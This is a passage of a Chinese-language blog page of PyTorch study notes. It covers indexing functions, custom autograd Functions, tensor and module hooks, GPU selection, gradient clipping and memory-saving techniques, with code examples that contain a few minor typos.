class="params">(ray.get(futures))</span></span></span><br></pre></td></tr></table></figure><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><h3 id="torch-index-select-input-dim-index"><a href="#torch-index-select-input-dim-index" class="headerlink" title="torch.index_select(input,dim,index)"></a>torch.index_select(input,dim,index)</h3><p>在维度dim上，按index索引数据<br>返回值：依index索引数据拼接成张量</p><h3 id="torch-masked-select-input-mask"><a href="#torch-masked-select-input-mask" class="headerlink" title="torch.masked_select(input,mask)"></a>torch.masked_select(input,mask)</h3><p>功能：按mask中的True进行索引<br>返回值：一维张量</p><h2 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h2><blockquote><p>基础函数，不带自动反向求导。可以用来生成Module模型(带自动求导)。</p></blockquote><h3 id="ctx"><a href="#ctx" class="headerlink" title="ctx"></a>ctx</h3><p>在function里会封装一个ctx函数，用来传递前向forward的结果到反向backwark进行梯度求导。</p><h3 id="以ChannNorm为例"><a href="#以ChannNorm为例" class="headerlink" title="以ChannNorm为例"></a>以ChannNorm为例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Function, Variable</span><br><span class="line"><span class="keyword">from</span> torch.nn.modules.module <span class="keyword">import</span> Module</span><br><span class="line"><span class="keyword">import</span> channelnorm_cuda <span class="comment">#cuda编写的函数</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelNormFunction</span>(<span class="title class_ inherited__">Function</span>):</span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">ctx, input1, norm_deg=<span class="number">2</span></span>):</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要保证输入是连续的</span></span><br><span class="line"><span class="keyword">assert</span> input1.is_contiguous()</span><br><span class="line">b, _, h, w = input1.size()</span><br><span class="line">output = input1.new(b,<span class="number">1</span>,h,w).zero_()</span><br><span class="line">channel_cuda.forward(input1, output, norm_deg)</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以看出针对参数变量使用save_for_backward来进行存储</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 应该是为了保存参数的特性，如类型</span></span><br><span class="line">ctx.save_for_backward(input1, output)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对不需要求导的对象则使用成员变量的形式存储</span></span><br><span class="line">ctx.norm_deg = norm_deg</span><br><span class="line"><span class="keyword">return</span> output</span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backward</span>(<span class="params">ctx, grad_output</span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># saved_tensors恢复ctx.save_for_backward存储的对象</span></span><br><span class="line">input1, output = ctx.saved_tensors</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将取出的对象使用Variable封装</span></span><br><span class="line">grad_input1 = Variable(input1.new(input1.size()).zero_())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用backward函数进行反向求导</span></span><br><span class="line">channelnorm_cuda.backward(input1, output, grad_output.data, grad_input1.data, ctx.norm_deg)</span><br><span class="line"><span class="keyword">return</span> grad_input1, <span class="literal">None</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelNorm</span>(<span class="title class_ inherited__">Module</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, norm_deg=<span class="number">2</span></span>):</span><br><span class="line"><span class="built_in">super</span>(ChannelNorm, self).__init__()</span><br><span class="line">self.norm_deg = norm_deg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Module来封装Function，实现自动求导。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, input1</span>):</span><br><span class="line"><span class="keyword">return</span> |ChannelNormFunction.apply(input1, self.norm_deg)</span><br></pre></td></tr></table></figure><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><blockquote><p>Hook 是 PyTorch 中一个十分有用的特性。利用它，我们可以不必改变网络输入输出的结构，方便地获取、改变网络中间层变量的值和梯度。</p></blockquote><h3 id="why"><a href="#why" class="headerlink" title="why"></a>why</h3><p>pytorch在每一次运算结束后，会将中间变量释放，以节省内存空间，这些会被释放的变量包括非叶子张量的梯度，中间层的特征图等。但有时候，我们想可视化中间层的特征图，又不能改动模型主体代码，该怎么办呢？这时候就要用到hook了。</p><blockquote><p>可视化中间结果，如梯度(反向传播之后中间节点的梯度会被清空)</p></blockquote><p>可视化参数，感觉有了tensorboardx之类的工具了，这个要来干嘛莫。<br>当前的kook主要分为2类：</p><ol><li>针对tensor</li><li>针对nn.Moudle</li></ol><h3 id="Hook-for-Tensors"><a href="#Hook-for-Tensors" class="headerlink" title="Hook for Tensors"></a>Hook for Tensors</h3><blockquote><p>torch.Tensor.register_hook (Python method, in torch.Tensor)</p></blockquote><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650003370050_0.png" alt="image.png"></p><h4 id="存在意义"><a href="#存在意义" class="headerlink" title="存在意义"></a>存在意义</h4><p>在 PyTorch 的计算图（computation graph）中，只有叶子结点（leaf nodes）的变量会保留梯度。而所有中间变量的梯度只被用于反向传播，一旦完成反向传播，中间变量的梯度就将自动释放，从而节约内存。</p><blockquote><p>但是可以通过retain_grad进行梯度的持久化。保留中间变量。但是这种方法会增加内存占用。所以就有了hook。</p></blockquote><blockquote></blockquote><p>对于中间变量z，hook的使用方式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z.register_hook(hook_fn)</span><br></pre></td></tr></table></figure><p>其中hook_fn是一个用户自定义的函数，其签名为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#后面的表示返回值</span></span><br><span class="line">hook_fn(grad)-&gt;Tensor <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_fn</span>(<span class="params">grad</span>):</span><br><span class="line"><span class="built_in">print</span>(grad)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这样z就可以通过z.register_hook(hook_fn)来捕获值了</span></span><br></pre></td></tr></table></figure><p>结果和上文中 z.retain_grad()方法得到的 z 的偏导一致。</p><blockquote><p>hook会改变变量的值，同时一个变量可以绑定多个hook_fn，反向传播时，它们按绑定顺序依次执行。</p></blockquote><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><h5 id="修改中间结果的梯度"><a href="#修改中间结果的梯度" class="headerlink" title="修改中间结果的梯度"></a>修改中间结果的梯度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">grad_hook</span>(<span class="params">grad</span>):</span><br><span class="line">grad *= <span class="number">2</span></span><br><span class="line">x = torch.tensor([<span class="number">2.</span>, <span class="number">2.</span>, <span class="number">2.</span>, <span class="number">2.</span>], requires_grad=<span class="literal">True</span>)</span><br><span class="line">y = torch.<span class="built_in">pow</span>(x, <span class="number">2</span>)</span><br><span class="line">z = torch.mean(y)</span><br><span class="line">h = x.register_hook(grad_hook)</span><br><span class="line">z.backward()</span><br><span class="line"><span class="built_in">print</span>(x.grad)</span><br><span class="line">h.remove()    <span class="comment"># removes the hook</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tensor([<span class="number">2.</span>, <span class="number">2.</span>, <span class="number">2.</span>, <span class="number">2.</span>])</span><br></pre></td></tr></table></figure><p>原x的梯度为tensor([1., 1., 1., 1.])，经grad_hook操作后，梯度为tensor([2., 2., 2., 2.])。</p><h5 id="查看中间节点的梯度"><a href="#查看中间节点的梯度" class="headerlink" title="查看中间节点的梯度"></a>查看中间节点的梯度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">y_grad= <span class="built_in">list</span>()</span><br><span class="line">defgrad_hook(grad):</span><br><span class="line">y_grad.append(grad)</span><br><span class="line">x= torch.tensor([<span class="number">2.</span>, <span class="number">2.</span>, <span class="number">2.</span>, <span class="number">2.</span>], requires_grad=<span class="literal">True</span>)</span><br><span class="line">y= torch.<span class="built_in">pow</span>(x, <span class="number">2</span>)</span><br><span class="line">z= torch.mean(y)</span><br><span class="line">h= y.register_hook(grad_hook)</span><br><span class="line">z.backward()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y.grad: &quot;</span>, y.grad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y_grad[0]: &quot;</span>, y_grad[<span class="number">0</span>])</span><br><span class="line">h.remove()<span class="comment"># removes the hook&gt;&gt;&gt; (&#x27;y.grad: &#x27;, None)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="string">&#x27;y_grad[0]: &#x27;</span>, tensor([<span class="number">0.2500</span>, <span class="number">0.2500</span>, <span class="number">0.2500</span>, <span class="number">0.2500</span>]))</span><br></pre></td></tr></table></figure><p>可以看到当z.backward()结束后，张量y中的grad为None，因为y是非叶子节点张量，在梯度反传结束之后，被释放。 在对张量y的hook函数（grad_hook）中，将y的梯度保存到了y_grad列表中，因此可以在z.backward()结束后，仍旧可以在y_grad[0]中读到y的梯度为tensor([0.2500, 0.2500, 0.2500, 0.2500])</p><h3 id="Hook-for-Modules"><a href="#Hook-for-Modules" class="headerlink" title="Hook for Modules"></a>Hook for Modules</h3><h4 id="why-1"><a href="#why-1" class="headerlink" title="why"></a>why</h4><blockquote><p>但是对于模型而言，对于夹在网络中间的模块，我们不但很难得知它输入&#x2F;输出的梯度，甚至连它输入输出的数值都无法获得除非设计网络时，在 forward 函数的返回值中包含中间 module 的输出，或者用很麻烦的办法，把网络按照 module 的名称拆分再组合，让中间层提取的 feature 暴露出来。</p></blockquote><h2 id="how"><a href="#how" class="headerlink" title="how"></a>how</h2><p>下面剖析一下<strong>module</strong>是怎么样<strong>调用hook</strong>函数的呢？</p><ol><li>output &#x3D; net(fake_img) net是一个module类，对module执行 module(input)是会调用module.call</li><li>module.<strong>call</strong> 在module.call中执行流程如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *<span class="built_in">input</span>, **kwargs</span>):</span><br><span class="line"><span class="keyword">for</span> hook <span class="keyword">in</span> self._forward_pre_hooks.values():</span><br><span class="line">hook(self, <span class="built_in">input</span>)</span><br><span class="line"><span class="keyword">if</span> torch._C._get_tracing_state():</span><br><span class="line">result = self._slow_forward(*<span class="built_in">input</span>, **kwargs)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = self.forward(*<span class="built_in">input</span>, **kwargs)</span><br><span class="line"><span class="keyword">for</span> hook <span class="keyword">in</span> self._forward_hooks.values(): <span class="comment"># 前向hook不能有返回值</span></span><br><span class="line">hook_result = hook(self, <span class="built_in">input</span>, result)</span><br><span class="line"><span class="keyword">if</span> hook_result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(</span><br><span class="line"><span class="string">&quot;forward hooks should never return any values, but &#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="string">&quot;didn&#x27;t return None&quot;</span>.<span class="built_in">format</span>(hook))</span><br><span class="line">...省略</span><br></pre></td></tr></table></figure>可以看出hook就定义在模型执行内部。</li></ol><h4 id="what"><a href="#what" class="headerlink" title="what"></a>what</h4><h5 id="torch-nn-Module-register-forward-hook→None"><a href="#torch-nn-Module-register-forward-hook→None" class="headerlink" title="torch.nn.Module.register_forward_hook→None"></a>torch.nn.Module.register_forward_hook→None</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nnas nn</span><br><span class="line">classNet(nn.Module):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">self.conv1= nn.Conv2d(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">self.pool1= nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">x= self.conv1(x)</span><br><span class="line">x= self.pool1(x)</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">farward_hook</span>(<span class="params">module, data_input, data_output</span>): <span class="comment"># 这里后两个变量是固定的，默认就对应了网络的输入和输出</span></span><br><span class="line">fmap_block.append(data_output)</span><br><span class="line">input_block.append(data_input)</span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化网络net= Net()</span></span><br><span class="line">net.conv1.weight[<span class="number">0</span>].fill_(<span class="number">1</span>)</span><br><span class="line">net.conv1.weight[<span class="number">1</span>].fill_(<span class="number">2</span>)</span><br><span class="line">net.conv1.bias.data.zero_()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册hookfmap_block= list()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于hook不能有返回值，所以就需要在hook外部定义载体</span></span><br><span class="line">input_block= <span class="built_in">list</span>()</span><br><span class="line">net.conv1.register_forward_hook(farward_hook) <span class="comment"># 注册hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># inference</span></span><br><span class="line">fake_img= torch.ones((<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>))<span class="comment"># batch size * channel * H * W</span></span><br><span class="line">output= net(fake_img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 观察print(&quot;output shape: &#123;&#125;\noutput value: &#123;&#125;\n&quot;.format(output.shape, output))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;feature maps shape: &#123;&#125;\noutput value: &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(fmap_block[<span class="number">0</span>].shape, fmap_block[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input shape: &#123;&#125;\ninput value: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(input_block[<span class="number">0</span>][<span class="number">0</span>].shape, input_block[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p>这里再conv1注册了hook，而conv1就是一个卷积模块(依旧是一个Moudle对象)，所以执行流程就是</p><ol><li>主体网络接受输入fake_img进行forward，并按call中的顺序执行(主体Module对象没有hook)</li><li>执行每个模块单元，并按call执行(这个时候就执行到了conv1，同样按Module call顺序执行，调用注册的hook)<br>⚠️ 在这里终于要执行我们注册的forward_hook函数了，就在hook_result &#x3D; hook(self, input, result)这里！ 看到这里我们需要注意两点：</li><li>hook_result &#x3D; hook(self, input, result)中的input和result不可以修改！ 这里的<strong>input对应forward_hook函数中的data_input，result对应forward_hook函数中的data_output，在conv1中，input就是该层的输入数据，result就是经过conv1层操作之后的输出特征图</strong>。虽然可以通过hook来对这些数据操作，但是不能修改这些值，否则会破坏模型的计算。</li><li>注册的hook函数是不能带返回值的，否则抛出异常，这个可以从代码中看到 if hook_result is not None: raise RuntimeError<br>总结一下调用流程： net(fake_img) –&gt; net.call : result &#x3D; self.forward(input, *kwargs) –&gt; net.forward: x &#x3D; self.conv1(x) –&gt; conv1.call:hook_result &#x3D; hook(self, input, result) hook就是我们注册的forward_hook函数了。</li></ol><h5 id="torch-nn-Module-register-forward-pre-hook"><a href="#torch-nn-Module-register-forward-pre-hook" class="headerlink" title="torch.nn.Module.register_forward_pre_hook"></a>torch.nn.Module.register_forward_pre_hook</h5><p>虽然也定义在Moudle call中，但是可以看到它的执行是在forward函数之前的</p><h5 id="torch-nn-Module-register-backward-hook→Tensor-or-None"><a href="#torch-nn-Module-register-backward-hook→Tensor-or-None" class="headerlink" title="torch.nn.Module.register_backward_hook→Tensor or None"></a>torch.nn.Module.register_backward_hook→Tensor or None</h5><p>Module反向传播中的hook,每次计算module的梯度后，自动调用hook函数。<br><strong>注意事项</strong>：当module有多个输入或输出时，grad_input和grad_output是一个tuple。<br><strong>应用场景举例</strong>：例如提取特征图的梯度 举例：采用register_backward_hook实现特征图梯度的提取，并结合Grad-CAM（基于类梯度的类激活图可视化）方法对卷积神经网络的学习模式进行可视化。</p><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="终端条件"><a href="#终端条件" class="headerlink" title="终端条件"></a>终端条件</h3><p>在执行命令之前添加</p><blockquote><p>CUDA_LAUNCH_BLOCKING&#x3D;1</p></blockquote><p>由于cuda是异步操作，所以报错的地方不一定是真正有问题的地方，在无法定位错误位置的时候，可以使用这个执行参数使得cuda变为同步的，这样就方便定位错误了。</p><h3 id="查看函数功能"><a href="#查看函数功能" class="headerlink" title="查看函数功能"></a>查看函数功能</h3><p>可以在python终端下使用：</p><blockquote><p>help(torch.gather)</p></blockquote><p>来实现函数的使用说明。</p><h3 id="指定GPU"><a href="#指定GPU" class="headerlink" title="指定GPU"></a>指定GPU</h3><p>当服务器中有多个GPU的时候，选择指定的GPU运行程序可在程序运行命令之前使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以多个0，1，2</span></span><br></pre></td></tr></table></figure><p>也可以将这行指令临时添加到终端反复使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export CUDA_VISIBLE_DEVICES=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>永久设置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在~/.bashrc 的最后加上export CUDA_VISIBLE_DEVICES=<span class="number">1</span>，然后source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="在代码中指定GPU"><a href="#在代码中指定GPU" class="headerlink" title="在代码中指定GPU"></a>在代码中指定GPU</h3><blockquote><p>指定GPU的命令需要放在和神经网络相关的一系列操作之前。</p></blockquote><h4 id="默认使用某块GPU"><a href="#默认使用某块GPU" class="headerlink" title="默认使用某块GPU"></a>默认使用某块GPU</h4><h5 id="一块"><a href="#一块" class="headerlink" title="一块"></a>一块</h5><p>设置当前使用的GPU设备仅为0号设备，设备名称为 &#x2F;gpu:0：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.environ[<span class="string">&quot;CUDA_VISIBLE_DEVICES&quot;</span>] = <span class="string">&quot;0&quot;</span></span><br></pre></td></tr></table></figure><h5 id="多块"><a href="#多块" class="headerlink" title="多块"></a>多块</h5><p>设置当前使用的GPU设备为0,1号两个设备，名称依次为 &#x2F;gpu:0、&#x2F;gpu:1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.environ[<span class="string">&quot;CUDA_VISIBLE_DEVICES&quot;</span>] = <span class="string">&quot;0,1&quot;</span></span><br></pre></td></tr></table></figure><p>根据顺序表示优先使用0号设备,然后使用1号设备。</p><h2 id="查看模型每层输出详情"><a href="#查看模型每层输出详情" class="headerlink" title="查看模型每层输出详情"></a>查看模型每层输出详情</h2><p>Keras有一个简洁的API来查看模型的每一层输出尺寸，这在调试网络时非常有用。现在在PyTorch中也可以实现这个功能。<br>使用很简单，如下用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torchsummary <span class="keyword">import</span> summary</span><br><span class="line"></span><br><span class="line"><span class="comment">#input_size 是根据你自己的网络模型的输入尺寸进行设置。</span></span><br><span class="line">summary(your_model, input_size=(channels, H, W))</span><br></pre></td></tr></table></figure><h2 id="梯度裁剪（Gradient-Clipping）"><a href="#梯度裁剪（Gradient-Clipping）" class="headerlink" title="梯度裁剪（Gradient Clipping）"></a>梯度裁剪（Gradient Clipping）</h2><p>梯度裁剪在某些任务上会额外消耗大量的计算时间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line">outputs = model(data)</span><br><span class="line">loss= loss_fn(outputs, target)</span><br><span class="line">optimizer.zero_grad()</span><br><span class="line">loss.backward()</span><br><span class="line">nn.utils.clip_grad_norm_(model.parameters(), max_norm=<span class="number">20</span>, norm_type=<span class="number">2</span>)</span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure><p>nn.utils.clip_grad_norm_的参数：<br><strong>parameters</strong> – 一个基于变量的迭代器，会进行梯度归一化<br><strong>max_norm</strong> – 梯度的最大范数<br><strong>norm_type</strong> – 规定范数的类型，默认为L2</p><h2 id="防止验证模型时爆显存"><a href="#防止验证模型时爆显存" class="headerlink" title="防止验证模型时爆显存"></a>防止验证模型时爆显存</h2><p>验证模型时不需要求导，即不需要梯度计算，关闭autograd，可以提高速度，节约内存。如果不关闭可能会爆显存。</p><h3 id="no-grad-1"><a href="#no-grad-1" class="headerlink" title="no_grad"></a>no_grad</h3><p>一般来说，我们在进行模型训练的过程中，因为要监控模型的性能，在跑完若干个epoch训练之后，需要进行一次在验证集[4]上的性能验证。一般来说，在验证或者是测试阶段，因为只是需要跑个前向传播(forward)就足够了，<strong>因此不需要保存变量的梯度</strong>。<br><strong>问题：</strong>保存梯度是需要额外显存或者内存进行保存的，占用了空间，有时候还会在验证阶段导致OOM(Out Of Memory)错误，因此我们在验证和测试阶段，最好显式地取消掉模型变量的梯度。通过no_grad实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">model.train()</span><br><span class="line"></span><br><span class="line"><span class="comment"># here train the model, just skip the codes</span></span><br><span class="line">model.<span class="built_in">eval</span>() <span class="comment"># here we start to evaluate the model</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> eval_data:</span><br><span class="line">data, label = each</span><br><span class="line">logit = model(data)</span><br><span class="line"><span class="meta">... </span><span class="comment"># here we just skip the codes</span></span><br></pre></td></tr></table></figure><p>在pytorch0.4之前的版本通过volatile&#x3D;True来进行设置。</p><h3 id="empty-cache"><a href="#empty-cache" class="headerlink" title="empty_cache"></a>empty_cache</h3><p>PyTorch的缓存分配器会事先分配一些固定的显存，即使实际上tensors并没有使用完这些显存，这些显存也不能被其他应用使用。这个分配过程由第一次CUDA内存访问触发的。<br>而 torch.cuda.empty_cache() 的作用就是释放缓存分配器当前持有的且未占用的缓存显存，以便这些显存可以被其他GPU应用程序中使用，并且通过 nvidia-smi命令可见。注意使用此命令不会释放tensors占用的显存。</p><h2 id="显存不够用"><a href="#显存不够用" class="headerlink" title="显存不够用"></a>显存不够用</h2><h3 id="retain-graph-1"><a href="#retain-graph-1" class="headerlink" title="retain_graph"></a>retain_graph</h3><blockquote><p>进行梯度累积，实现内存紧张情况下的大batch_size训练,在GPU显存紧张的情况下使用可以等价于用更大的batch_size进行训练。</p></blockquote><p>首先我们要明白，当调用.backward()时，其实是对损失到各个节点的梯度进行计算，计算结果将会保存在各个节点上，如果不用opt.zero_grad()对其进行清0，那么只要你一直调用.backward()梯度就会一直累积，没有调用优化器就不会使用这些梯度来更新参数，多次backward之后再调用优化器相当于是在大的batch_size下进行的训练。</p><h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">net</span>(nn.Module):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="built_in">super</span>().__init__()</span><br><span class="line">self.fc1 = nn.Linear(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line">self.act = nn.ReLU()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,inputv</span>):</span><br><span class="line"><span class="keyword">return</span> self.act(self.fc1(inputv))</span><br><span class="line">n = net()</span><br><span class="line">inputv = torch.tensor(np.random.normal(size=(<span class="number">4</span>,<span class="number">10</span>))).<span class="built_in">float</span>()</span><br><span class="line">output = n(inputv)</span><br><span class="line">target = torch.tensor(np.ones((<span class="number">4</span>,<span class="number">2</span>))).<span class="built_in">float</span>()</span><br><span class="line">loss = nn.functional.mse_loss(output, target)</span><br><span class="line">loss.backward(retain_graph=<span class="literal">True</span>)</span><br><span class="line">opt = torch.optim.Adam(n.parameters(),lr=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> n.parameters():</span><br><span class="line"><span class="built_in">print</span>(each.grad)</span><br></pre></td></tr></table></figure><p>第一次输出:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[ <span class="number">0.0493</span>, -<span class="number">0.0581</span>, -<span class="number">0.0451</span>,  <span class="number">0.0485</span>,  <span class="number">0.1147</span>,  <span class="number">0.1413</span>, -<span class="number">0.0712</span>, -<span class="number">0.1459</span>,</span><br><span class="line"><span class="number">0.1090</span>, -<span class="number">0.0896</span>],</span><br><span class="line">[ <span class="number">0.0000</span>,  <span 